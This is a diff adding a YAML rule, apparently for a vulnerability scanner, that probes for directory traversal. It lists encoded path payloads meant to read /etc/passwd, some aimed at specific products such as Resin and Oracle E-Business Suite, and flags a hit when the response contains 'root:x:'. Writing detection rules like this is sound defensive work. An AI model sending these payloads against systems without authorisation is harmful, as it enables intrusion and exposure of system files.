@@ -1,0 +1,20 @@
+name: Directory traversal
+scan_rule:
+  method: GET
+  path:
+    - /etc/passwd
+    - /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/222/11
+    - /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+    - /test/dev/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+    - /../../../../../../../../../../../../../etc/passwd
+    - //././././././././././././././././././././././././../../../../../../../../etc/passwd
+    - /aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/passwd
+    - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+    - /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+    - /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+    - /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+    - /api-third-party/download/extdisks../etc/passwd
+    - /resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
+    - /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
+    - /OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
+check_expression: ('root:x:' in text)
